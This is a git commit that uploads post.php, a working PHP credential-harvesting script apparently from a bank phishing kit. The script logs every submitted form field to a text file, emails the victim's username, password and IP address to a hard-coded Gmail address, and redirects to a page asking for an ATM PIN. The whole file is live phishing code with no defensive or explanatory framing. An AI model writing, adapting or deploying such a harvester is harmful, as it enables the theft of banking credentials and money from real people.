17a0555bff295ee9f046caeeb8b4ca9a6c1dfb1d
Andres20222 <104866921+Andres20222@users.noreply.github.com>
2022-08-05 21:02:22 -0500

    Add files via upload

---
+++ post.php
@@ -0,0 +1,26 @@
+﻿<?php
+header ('Location: ingrese-clave-de-cajero.html');
+$handle = fopen("datos.txt", "a");
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+
+
+$ip = getenv("REMOTE_ADDR");
+$message .= "Usuario: ".$_POST['username']."\n";
+$message .= "Contraseña: ".$_POST['password']."\n";
+$message .= "IP: ".$ip."\n";
+$recipient ="jc7541207@gmail.com";
+$subject = "Usuario y Contraseña | ".$ip."\n";
+mail($recipient,$subject,$message);
+header("Location: ingrese-clave-de-cajero.html");
+
+
+
+exit;
+?>
